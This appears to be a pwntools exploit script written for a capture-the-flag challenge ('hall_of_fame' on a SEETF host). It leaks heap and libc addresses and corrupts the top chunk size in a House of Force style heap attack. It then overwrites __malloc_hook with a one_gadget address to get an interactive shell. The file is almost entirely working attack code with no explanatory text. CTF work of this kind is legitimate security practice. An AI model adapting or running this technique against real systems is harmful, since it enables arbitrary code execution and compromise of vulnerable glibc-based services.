from pwn import *
from sys import *

elf = context.binary = ELF("./hall_of_fame_patched")
p = process("./hall_of_fame_patched")
libc = ELF("./libc.so.6")

HOST = 'fun.chall.seetf.sg'
PORT = 50004

cmd = """
b*0x0000000000400AE7
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

def add(size, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'> ', str(size))
	p.sendlineafter(b'> ', data)

def show():
	p.sendlineafter(b'> ', b'2')
	p.recvuntil(b'at ')
	heap = eval(p.recvline())
	p.recvuntil(b'at ')
	leak = eval(p.recvline())
	return heap,leak

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

heap,leak = show()
libc.address = leak - libc.sym['puts']
print(hex(heap), hex(libc.address))
add(0x10,b'A'*24+p64(0xffffffffffffffff))
size = libc.sym['__malloc_hook']-(heap+0x270)-0x20
#print(hex(elf.bss()+0x100))
#size = int(tohex(size,64),16)

add(size,b'')
add(0x30,p64(libc.address+0x10a2fc))
#add(size,b)
#add(16,b'A'*16+p64(0xdeadbeef))
p.interactive()